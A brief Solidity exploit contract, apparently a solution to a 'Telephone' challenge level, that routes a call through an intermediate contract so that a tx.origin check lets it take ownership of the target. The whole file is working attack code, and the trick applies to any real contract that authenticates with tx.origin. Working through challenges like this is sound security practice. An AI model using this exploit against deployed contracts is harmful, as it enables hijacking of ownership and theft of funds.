// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Attack {

    address private immutable target;
    address myAccount;

    constructor(address taregtAddr, address accountAddr) {
        target = taregtAddr;
        myAccount = accountAddr;
    }
    
    // use this contract to call our target contract, so `msg.sender` will be the former and `tx.origon` will be our wallet account.
    function callChangeOwner() external { 
        ITelephone(target).changeOwner(myAccount);
    }
}
